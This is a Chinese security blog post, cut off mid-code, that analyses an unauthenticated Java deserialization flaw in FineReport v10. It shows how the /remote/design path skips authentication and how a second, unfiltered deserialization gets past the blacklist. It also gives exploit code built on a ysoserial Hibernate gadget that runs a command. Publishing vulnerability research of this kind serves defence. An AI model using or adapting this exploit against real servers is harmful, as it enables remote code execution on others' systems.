@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <title>FineReport v10反序列化漏洞挖掘-fuzz7j's Blog</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="content-language" content="zh-CN" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="supported-color-schemes" content="light dark">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="applicable-device" content="pc,mobile">
+  <meta name="author" content="" />
+  <meta name="description" content="FineReport v10反序列化漏洞挖掘"/>
+  <meta name="keywords" content=",Java"/>
+  <link rel="icon" href="/static/img/favicon.ico" />
+  <link rel="apple-touch-icon" href="/static/img/logo.png" />
+  <link rel="stylesheet" href="/static/css/common.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/theme-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/post.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-light.css?t=20230716172519">
+  <link rel="prefetch" href="/static/xml/search.xml?t=20230716172519">
+  <link rel="prefetch" href="/static/js/search.js?t=20230716172519">
+  <script>
+    window.blog = {
+      baseurl:"",
+      buildAt:"20230716172519",
+      darkTheme: false,
+      setDarkTheme: function (dark) {
+        this.darkTheme = Boolean(dark);
+        document.documentElement.className = this.darkTheme ? 'dark': '';
+        document.querySelector('meta[name=theme-color]').setAttribute('content', this.darkTheme ? '#2D2E32': '#FFFFFF');
+      }
+    }
+    if (sessionStorage.darkTheme !== undefined) {
+      blog.setDarkTheme(sessionStorage.darkTheme === 'true'); // 记忆值，单个窗口内有效
+    } else {
+      blog.setDarkTheme(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches); // 跟随系统
+    }
+    if (window.matchMedia) {
+      var media = window.matchMedia('(prefers-color-scheme: dark)');
+      media.addListener(function (ev) {
+        blog.setDarkTheme(ev.currentTarget.matches);
+        sessionStorage.removeItem('darkTheme');
+      });
+    }
+  </script>
+</head>
+<body ondragstart="return false;">
+<header class="header">
+  <img class="logo" src="/static/img/logo.jpg" alt="logo"/>
+  <nav class="menu">
+    <a href="/" class="hover-underline">首页</a>
+    <a href="/pages/categories" class="hover-underline">归档</a>
+    <a href="/pages/search" class="hover-underline">搜索</a>
+    <a href="/pages/links" class="hover-underline">友链</a>
+    <a href="/pages/about" class="hover-underline">关于</a>
+    </nav>
+</header>
+<div class="page page-post">
+  <h1 class="title" id="FineReport v10反序列化漏洞挖掘">FineReport v10反序列化漏洞挖掘</h1>
+  
+  <div class="subtitle"> 于 2023-01-19 发布</div>
+  
+  <div class="post">
+    <h2 id="前言">前言</h2>
+
+<p>hw期间拿到的漏洞，修改exp的计划拖了很久，趁年底尝试一下从0到1进行挖掘。</p>
+
+<h2 id="漏洞挖掘过程">漏洞挖掘过程</h2>
+
+<p>查看<code class="highlighter-rouge">com.fr.decision.base.DecisionServletInitializer#start</code>发现加载配置类<code class="highlighter-rouge">DecisionConfiguration.class</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">start</span><span class="o">()</span> <span class="o">{</span>
+    <span class="nc">ServletContext</span> <span class="n">var1</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ServletContext</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">getModule</span><span class="o">().</span><span class="na">upFindSingleton</span><span class="o">(</span><span class="nc">ServletContext</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">AnnotationConfigWebApplicationContext</span> <span class="n">var2</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AnnotationConfigWebApplicationContext</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">getModule</span><span class="o">().</span><span class="na">upFindSingleton</span><span class="o">(</span><span class="nc">AnnotationConfigWebApplicationContext</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="o">...</span>
+        <span class="n">var2</span><span class="o">.</span><span class="na">register</span><span class="o">(</span><span class="nc">DecisionConfiguration</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="o">...</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>跟进<code class="highlighter-rouge">com.fr.decision.base.DecisionConfiguration</code>，发现<code class="highlighter-rouge">addInterceptors</code>方法中，<code class="highlighter-rouge">DecisionInterceptor</code>将<code class="highlighter-rouge">/remote/design</code>排除不进行拦截，所以<code class="highlighter-rouge">com.fr.decision.extension.report.api.remote.RemoteDesignResource</code>中路径都存在未授权访问。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">addInterceptors</span><span class="o">(</span><span class="nc">InterceptorRegistry</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+    <span class="o">...</span>
+    <span class="n">var1</span><span class="o">.</span><span class="na">addInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="nc">DecisionInterceptor</span><span class="o">()).</span><span class="na">addPathPatterns</span><span class="o">(</span><span class="s">"/**"</span><span class="o">).</span><span class="na">excludePathPatterns</span><span class="o">(</span><span class="s">"/remote/design/**"</span><span class="o">).</span><span class="na">excludePathPatterns</span><span class="o">(</span><span class="s">"/v10/deployment/**"</span><span class="o">).</span><span class="na">excludePathPatterns</span><span class="o">(</span><span class="s">"/v5/design/widget/data"</span><span class="o">).</span><span class="na">excludePathPatterns</span><span class="o">(</span><span class="s">"/v5/design/tables/fields"</span><span class="o">).</span><span class="na">excludePathPatterns</span><span class="o">(</span><span class="s">"/export/check/**"</span><span class="o">);</span>
+    <span class="o">...</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>查看该类中方法，跟进<code class="highlighter-rouge">com.fr.decision.webservice.v10.remote.RemoteDesignService#onMessage</code>查看业务逻辑。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onMessage</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">var1</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">var2</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">var3</span> <span class="o">=</span> <span class="nc">IOUtils</span><span class="o">.</span><span class="na">inputStream2Bytes</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+    <span class="n">var2</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="nc">WorkContext</span><span class="o">.</span><span class="na">handleMessage</span><span class="o">(</span><span class="n">var3</span><span class="o">));</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>这里将var1传递到WorkContext.handleMessage()，继续跟进到<code class="highlighter-rouge">com.fr.workspace.WorkContext#handleMessage</code>，此处的<code class="highlighter-rouge">com.fr.workspace.connect.WorkspaceMessageHandler</code>为接口类。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">handleMessage</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">var0</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">messageListener</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="s">"Invalid server."</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">messageListener</span><span class="o">.</span><span class="na">handleMessage</span><span class="o">(</span><span class="n">var0</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>继续跟进到<code class="highlighter-rouge">com.fr.workspace.engine.rpc.WorkspaceServerInvoker#handleMessage</code>，进入<code class="highlighter-rouge">deserializeInvocation</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">handleMessage</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">FineResult</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FineResult</span><span class="o">();</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="nc">Invocation</span> <span class="n">var3</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">var3</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">deserializeInvocation</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="n">var2</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">serializeResult</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="o">...</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Throwable</span> <span class="n">var15</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">FineLoggerFactory</span><span class="o">.</span><span class="na">getLogger</span><span class="o">().</span><span class="na">error</span><span class="o">(</span><span class="n">var15</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var15</span><span class="o">);</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+      <span class="o">}</span>
+   <span class="o">}</span>
+</code></pre></div></div>
+
+<p>继续查看<code class="highlighter-rouge">com.fr.workspace.engine.rpc.WorkspaceServerInvoker#deserializeInvocation</code>，发现调用<code class="highlighter-rouge">SerializerHelper.deserialize</code>，<code class="highlighter-rouge">GZipSerializerWrapper.wrap(InvocationSerializer.getDefault())</code>将<code class="highlighter-rouge">GZipSerializerWrapper</code>的反序列化器设置为<code class="highlighter-rouge">InvocationSerializer</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">Invocation</span> <span class="nf">deserializeInvocation</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">var1</span><span class="o">,</span> <span class="nc">FineResult</span> <span class="n">var2</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="o">(</span><span class="nc">Invocation</span><span class="o">)</span><span class="nc">SerializerHelper</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="nc">GZipSerializerWrapper</span><span class="o">.</span><span class="na">wrap</span><span class="o">(</span><span class="nc">InvocationSerializer</span><span class="o">.</span><span class="na">getDefault</span><span class="o">()));</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">var2</span><span class="o">.</span><span class="na">setResult</span><span class="o">((</span><span class="nc">Object</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">var2</span><span class="o">.</span><span class="na">setException</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
+        <span class="k">throw</span> <span class="n">var4</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>然后查看<code class="highlighter-rouge">com.fr.serialization.SerializerHelper#deserialize(byte[], com.fr.serialization.Serializer&lt;T&gt;)</code>，此处的var1为<code class="highlighter-rouge">GZipSerializerWrapper</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;</span> <span class="no">T</span> <span class="nf">deserialize</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">var0</span><span class="o">,</span> <span class="nc">Serializer</span><span class="o">&lt;</span><span class="no">T</span><span class="o">&gt;</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">var1</span> <span class="o">=</span> <span class="nc">SerializerSummaryAdaptor</span><span class="o">.</span><span class="na">get</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="nc">ByteArrayInputStream</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">var0</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">var1</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">GZipSerializerWrapper.deserialize()</code>对传入参数进行Gzip解码，然后传递给<code class="highlighter-rouge">InvocationSerializer.deserialize()</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="no">T</span> <span class="nf">deserialize</span><span class="o">(</span><span class="nc">InputStream</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+    <span class="nc">GZIPInputStream</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GZIPInputStream</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">serializer</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>继续跟进<code class="highlighter-rouge">com.fr.rpc.serialization.InvocationSerializer#deserialize</code>，发现<code class="highlighter-rouge">JDKSerializer.CustomObjectInputStream</code>存在反序列化过滤，黑名单<code class="highlighter-rouge">/com/fr/serialization/blacklist.txt</code>，但生成<code class="highlighter-rouge">Invocation</code>对象后调用了<code class="highlighter-rouge">readParams</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="nc">Invocation</span> <span class="nf">deserialize</span><span class="o">(</span><span class="nc">InputStream</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+    <span class="nc">DKSerializer</span><span class="o">.</span><span class="na">CustomObjectInputStream</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">JDKSerializer</span><span class="o">.</span><span class="na">CustomObjectInputStream</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+    <span class="nc">InvocationSerializer</span><span class="o">.</span><span class="na">InvocationPack</span> <span class="n">var3</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationSerializer</span><span class="o">.</span><span class="na">InvocationPack</span><span class="o">)</span> <span class="n">var2</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="nc">Map</span> <span class="n">var4</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="n">var2</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="nc">Invocation</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var3</span><span class="o">.</span><span class="na">toInvocation</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">readParams</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">params</span><span class="o">));</span>
+    <span class="n">var5</span><span class="o">.</span><span class="na">getMetadata</span><span class="o">().</span><span class="na">putAll</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">var5</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>跟进<code class="highlighter-rouge">com.fr.rpc.serialization.InvocationSerializer#readParams</code>，此处再次调用<code class="highlighter-rouge">SerializerHelper.deserialize</code>进行反序列化，此方法不存在过滤。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">Object</span><span class="o">[]</span> <span class="nf">readParams</span><span class="o">(</span><span class="kt">byte</span><span class="o">[][]</span> <span class="n">var1</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+    <span class="nc">Object</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="n">var1</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
+
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">var3</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var3</span> <span class="o">&lt;</span> <span class="n">var1</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">var2</span><span class="o">[</span><span class="n">var3</span><span class="o">]</span> <span class="o">=</span> <span class="nc">SerializerHelper</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">var1</span><span class="o">[</span><span class="n">var3</span><span class="o">],</span> <span class="k">this</span><span class="o">.</span><span class="na">paramSerializer</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="k">return</span> <span class="n">var2</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="构造exp">构造exp</h2>
+
+<p>根据上文，构造<code class="highlighter-rouge">com.fr.rpc.serialization.InvocationSerializer$InvocationPack</code>对象，将序列化数据写入params。</p>
+
+<p>发送exp时，<code class="highlighter-rouge">JDKSerializer.CustomObjectInputStream</code>读取到的类为<code class="highlighter-rouge">com.fr.rpc.serialization.InvocationSerializer$InvocationPack</code>，通过黑名单检测后，<code class="highlighter-rouge">com.fr.rpc.serialization.InvocationSerializer#readParams</code>进行二次反序列化。</p>
+
+<p><img src="CustomObjectInputStream.png" alt="image" /></p>
+
+<p>反序列化过程中进行了一次Gzip解码，需要对生成的序列化数据进行Gzip编码后发送。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">package</span> <span class="n">finereport</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.fr.rpc.Invocation</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fr.third.org.hibernate.engine.spi.TypedValue</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fr.third.org.hibernate.type.AbstractType</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.fr.third.org.hibernate.type.ComponentType</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.ObjectPayload</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Gadgets</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">ysoserial.payloads.util.Reflections</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.stream.Stream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.zip.GZIPOutputStream</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">exp</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+
+        <span class="nc">String</span> <span class="n">command</span> <span class="o">=</span> <span class="s">"calc.exe"</span><span class="o">;</span>
+
+        <span class="nc">Class</span> <span class="n">clazz3</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"finereport.HibernatePoc"</span><span class="o">);</span>
+        <span class="nc">ObjectPayload</span><span class="o">&lt;?&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ObjectPayload</span><span class="o">&lt;?&gt;)</span> <span class="n">clazz3</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="kd">final</span> <span class="nc">Object</span> <span class="n">objBefore</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+
+        <span class="nc">ByteArrayOutputStream</span> <span class="n">b1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="n">b1</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">objBefore</span><span class="o">);</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="n">b1</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="nc">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.fr.rpc.Invocation"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">m</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Method</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">m</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+        <span class="nc">Invocation</span> <span class="n">inv</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Invocation</span><span class="o">)</span> <span class="n">m</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">),</span> <span class="nc">Stream</span><span class="o">.</span><span class="na">of</span><span class="o">(</span><span class="n">b1</span><span class="o">).</span><span class="na">toArray</span><span class="o">());</span>
+
+        <span class="nc">Class</span> <span class="n">clazz2</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.fr.rpc.serialization.InvocationSerializer$InvocationPack"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">m2</span> <span class="o">=</span> <span class="n">clazz2</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[][].</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">m2</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1</span><span class="o">][];</span>
+        <span class="n">bytes</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">b1</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+
+        <span class="nc">ObjectOutputStream</span> <span class="n">oos2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"xxx.ser"</span><span class="o">));</span>
+        <span class="n">oos2</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">m2</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">bytes</span><span class="o">));</span>
+        <span class="n">oos2</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">inv</span><span class="o">.</span><span class="na">getMetadata</span><span class="o">());</span>
+        <span class="n">oos2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="nc">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">compress</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"xxx.ser"</span><span class="o">))));</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">compress</span><span class="o">(</span><span class="nc">FileInputStream</span> <span class="n">fis</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">ByteArrayOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="nc">GZIPOutputStream</span> <span class="n">gos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GZIPOutputStream</span><span class="o">(</span><span class="n">bos</span><span class="o">);</span>
+
+        <span class="kt">int</span> <span class="n">count</span><span class="o">;</span>
+        <span class="kt">byte</span> <span class="n">data</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">8092</span><span class="o">];</span>
+        <span class="k">while</span> <span class="o">((</span><span class="n">count</span> <span class="o">=</span> <span class="n">fis</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">8092</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">gos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">count</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="n">gos</span><span class="o">.</span><span class="na">finish</span><span class="o">();</span>
+
+        <span class="n">gos</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+        <span class="n">gos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="k">return</span> <span class="n">bos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+<span class="kd">class</span> <span class="nc">HibernatePoc</span> <span class="kd">implements</span> <span class="nc">ObjectPayload</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nc">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Object</span> <span class="n">tpl</span> <span class="o">=</span> <span class="nc">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+        <span class="nc">Object</span> <span class="n">getters</span> <span class="o">=</span> <span class="n">makeHibernate5Getter</span><span class="o">(</span><span class="n">tpl</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="s">"getOutputProperties"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="nf">makeHibernate45Caller</span><span class="o">(</span><span class="n">tpl</span><span class="o">,</span> <span class="n">getters</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">makeHibernate45Caller</span><span class="o">(</span><span class="nc">Object</span> <span class="n">tpl</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">getters</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+
+        <span class="nc">PojoComponentTuplizer</span> <span class="n">tup</span> <span class="o">=</span> <span class="nc">Reflections</span><span class="o">.</span><span class="na">createWithoutConstructor</span><span class="o">(</span><span class="nc">PojoComponentTuplizer</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
